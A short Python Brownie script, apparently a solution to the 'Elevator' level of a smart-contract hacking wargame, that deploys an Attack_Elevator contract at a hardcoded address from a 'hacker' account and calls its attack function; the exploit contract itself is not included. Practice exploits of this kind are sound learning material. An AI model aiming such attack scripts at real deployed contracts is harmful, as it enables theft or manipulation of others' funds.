from brownie import accounts, config, Attack_Elevator
def main():
    contract = '0xFC0E9006B420Afc329c2D30EA8D02fE6FD8d6D65'
    hacker = accounts.add(config['wallets']['from_key'])

    attack = Attack_Elevator.deploy(contract, {'from': hacker, 'allow_revert': True, 'gas_limit': 600000})

    attack.attack({'from': hacker, 'allow_revert': True, 'gas_limit': 600000})
